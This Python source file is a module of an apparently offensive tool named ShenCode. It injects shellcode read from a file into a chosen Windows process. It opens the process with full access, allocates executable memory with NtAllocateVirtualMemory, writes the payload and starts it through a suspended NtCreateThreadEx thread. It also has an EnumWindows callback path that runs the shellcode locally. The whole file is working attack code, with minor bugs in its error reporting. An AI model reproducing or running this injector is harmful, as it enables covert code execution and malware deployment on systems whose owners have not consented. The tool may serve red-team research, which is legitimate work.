########################################################
### ShenCode Module
###
### Name: NT-Injection
### Docs: https://heckhausen.it/shencode/README
### 
########################################################

from ctypes import wintypes
import subprocess
from time import sleep
#import os
from utils.windef import pNtAllocateVirtualMemory, pNtWriteVirtualMemory, pNtCreateThreadEx, pNtResumeThread, WaitForSingleObject, OpenProcess, CloseHandle, VirtualAlloc, RtlMoveMemory, pEnumWindows, HANDLE, ACCESS_MASK, SIZE_T, ULONG, LPCVOID
from utils.winconst import MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE, NT_SUCCESS, PROCESS_ALL_ACCESS, GENERIC_ALL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
from utils.style import *
from utils.helper import CheckFile

CATEGORY    = 'inject'
DESCRIPTION = 'NT-Injection with native windows API (experimental)'

css = ConsoleStyles()
cs_print = css.console_print()

def register_arguments(parser):
            parser.add_argument('-i', '--input', help='Input file for process injection')
            parser.add_argument('-p', '--process', help='Processname to inject the shellcode')

            grp = parser.add_argument_group('additional')
            grp.add_argument('-s', '--start-process', action='store_true', help='If not active, start the process before injection')

class module:
    from urllib import request
    from time import sleep
    import ctypes
    import wmi
    import threading

    Author = 'psycore8'
    Version = '1.0.1'
    DisplayName = 'NATIVE-INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int
    nt_error = 0
    callback_func = False
    shellcode = b''
    relay_input = False

    def __init__(self, input, start_process, process):
        self.input_file = input
        self.process_start = start_process
        self.target_process = process

    def Start_Process(self):
        cs_print.note(f'Starting {self.target_process}')
        #os.system(self.target_process)
        subprocess.run(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        cs_print.ok(f'{self.target_process} process id: {self.pid}')
        return int(self.pid)

    def start_injection(self):
        if self.callback_func:
            mem = VirtualAlloc(0, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
            cs_print.note(f'Allocated memory address: 0x{mem:X}')
            RtlMoveMemory(mem, self.shellcode, len(self.shellcode))
            try:
                pEnumWindows(mem, 0) # type: ignore
            except:
                cs_print.error('EnumWindows exception!')
                return
            exit()

        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            sleep(3)

        process_id = self.get_proc_id()
        base_address = self.ctypes.c_void_p(0)
        
        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            cs_print.ok('Opened a Handle to the process')

        rs = SIZE_T(len(self.shellcode))
        rs_ptr = self.ctypes.byref(rs)
        memory = pNtAllocateVirtualMemory(phandle, self.ctypes.byref(base_address), 0, rs_ptr, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE) # type: ignore
        if memory == NT_SUCCESS:
            cs_print.ok('Allocated Memory in the process')
        else:
            self.nt_error = memory
            cs_print.error(f'Error during memory allocation for address 0x{self.nt_error:X}')
            return

        bs = len(self.shellcode)
        writing = pNtWriteVirtualMemory(phandle, base_address, self.shellcode, bs, None) # type: ignore
        if writing == NT_SUCCESS:
            cs_print.ok('Wrote The shellcode to memory')
        else:
            self.nt_error = memory
            cs_print.error(f'Error during memory writing to address 0x{self.nt_error:X}')
            return
        th = HANDLE()
        Injection = pNtCreateThreadEx(self.ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, base_address, None, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, None)  # type: ignore

        if Injection == NT_SUCCESS :
            cs_print.ok('Injected the shellcode into the process')
        else:
            self.nt_error = memory
            cs_print.error(f'Error during thread creation at address 0x{self.nt_error:X}')
            return

        cs_print.note('Thread suspended, waiting 10 seconds...')
        sleep(1)

        suspend_count = ULONG(0)
        resume = pNtResumeThread(th, self.ctypes.byref(suspend_count))  # type: ignore
        WaitForSingleObject(th, -1)

        if resume == NT_SUCCESS:
            cs_print.ok('Injection successful')
        else:
            cs_print.error('Injection failed')
        CloseHandle(phandle)

    def proc_inject(self):
        return False
    
    def open_file(self):
        if self.relay_input:
            self.shellcode = bytes(self.input_file)
        else:
            try:
                with open(self.input_file, 'rb') as file:
                    self.shellcode = file.read()
            except FileNotFoundError:
                return False
    
    def process(self):
        css.module_header(self.DisplayName, self.Version)
        if not self.relay_input:
            cs_print.note('Open file...')
            if CheckFile(self.input_file):
                css.action_open_file2(self.input_file)
            else:
                cs_print.error(f'File {self.input_file} not found or cannot be opened.')
        self.open_file()
        cs_print.note('Try to execute shellcode')
        self.start_injection()
        cs_print.ok('DONE!')
